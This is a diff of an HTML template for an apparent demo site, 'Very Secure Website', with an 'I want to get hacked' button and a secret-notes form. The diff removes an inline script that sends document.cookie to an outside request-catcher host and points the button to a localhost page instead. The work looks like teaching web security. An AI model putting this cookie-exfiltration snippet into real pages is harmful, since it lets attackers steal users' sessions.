@@ -9,14 +9,6 @@
 </head>
 
 <body>
-<script>
-    function haxd() { 
-        document.getElementById("hack-me").style.display = "block";
-        var url = "https://haq.requestcatcher.com/?=" + document.cookie;
-        var win = window.open(url, '_blank');
-        win.focus();
-    }
-</script>
 <div class="columns is-mobile is-centered">
 	<div class="column is-two-thirds">
 		<h1 class="title is-1">Very Secure Website</h1>
@@ -35,8 +27,7 @@
 							</ul>
 					</h1>
 
-					<button class="button is-fullwidth is-medium is-danger" id="hack-me" onclick="haxd()">I want to get hacked</button>
-
+					<button class="button is-fullwidth is-medium is-danger" id="hack-me" onclick="window.open('http://localhost:5001/hack_me', '_blank')">I want to get hacked</button>
 					<form method="POST" name="form" action="{{ url_for('post_note') }}">
 						<div class="field">
 							<label class="label">Update your secret messages!</label>
